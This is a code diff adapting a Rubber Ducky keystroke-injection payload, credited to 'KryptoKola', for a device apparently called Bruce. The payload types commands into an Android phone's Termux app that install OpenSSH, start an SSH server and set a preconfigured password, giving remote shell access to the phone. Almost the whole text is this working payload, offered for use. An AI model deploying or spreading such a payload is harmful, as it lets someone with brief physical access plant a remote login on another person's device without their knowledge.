@@ -5,8 +5,10 @@ REM       Author: KryptoKola
 REM	    Requirements: RubberDucky, Android Device with Termux Installed
 REM       Description: This payload will install and run OpenSSH on Android devices with Termux installed. (Termux should be installed from F-droid for best results).
 REM	    Configuration: Place a password in the "NewPasswordHere" and "ConfirmPasswordHere" fields below.
+REM [Bruce compat rewrite]: ATTACKMODE HID removed — Bruce's ducky_typer.cpp
+REM has no ATTACKMODE support, it is always a plain HID keyboard, so this
+REM line was a no-op for Bruce anyway. STRINGLN converted to STRING+ENTER.
 
-ATTACKMODE HID
 DELAY 500
 GUI f
 DELAY 1000
@@ -18,11 +20,14 @@ TAB
 DELAY 500
 ENTER
 DELAY 1500
-STRINGLN pkg update -y;pkg install root-repo -y;pkg install openssh -y;ssh-keygen -A;sshd;passwd;
+STRING pkg update -y;pkg install root-repo -y;pkg install openssh -y;ssh-keygen -A;sshd;passwd;
+ENTER
 DELAY 20000
-STRINGLN NewPasswordHere
+STRING NewPasswordHere
+ENTER
 DELAY 500
-STRINGLN ConfirmPasswordHere
+STRING ConfirmPasswordHere
+ENTER
 DELAY 500
 ALT F4
 DELAY 100
